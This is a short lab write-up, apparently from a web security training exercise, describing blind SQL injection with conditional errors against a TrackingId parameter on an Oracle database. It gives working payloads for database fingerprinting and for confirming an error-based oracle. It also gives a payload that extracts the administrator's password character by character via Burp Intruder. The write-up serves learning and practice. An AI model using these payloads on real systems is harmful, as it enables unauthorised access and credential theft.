# Lab: Blind SQL injection with conditional errors
## Description

1) Identified the SQLi by injecting a single quote into the TrackingId parameter, triggering an Internal Server Error.

2) I spent some time trying to just trigger a conditional error, but they all kept failing. I had to take a step back..

3) I first had to identify the database! I eventually identified the database as Oracle using the following injection: `' AND (SELECT version FROM v$instance)='a`

4) Knowing the DB, its was suddenly much easier to debug the conditional error injection. The two injections were used to confirm it:

`' AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE 'a' END FROM dual)='a` (500 Internal Server Error)

`' AND (SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE 'a' END FROM dual)='a` (200 OK)

5) Extraction time! The query become pretty complicated, so I first built the condition select statement: `SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1)='a'` and combined that with the conditional error injectin from previous step. The final injection would look something like this:

`' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1)='a') THEN 'a' ELSE to_char(1/0) END FROM dual)='a`

With this, I moved the payload into Intruder and configured a Cluster Bomb attack.


## Solution

See description.
